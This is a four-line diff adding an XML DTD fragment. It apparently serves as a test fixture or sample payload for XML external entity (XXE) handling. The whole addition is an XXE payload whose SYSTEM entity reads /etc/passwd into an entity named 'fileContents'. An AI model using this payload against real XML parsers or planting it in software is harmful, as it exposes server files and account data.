@@ -1,0 +1,4 @@
+<!ENTITY % start "amit">
+<!ENTITY % end SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY fileContents '%start;%end;'>">
+%all;
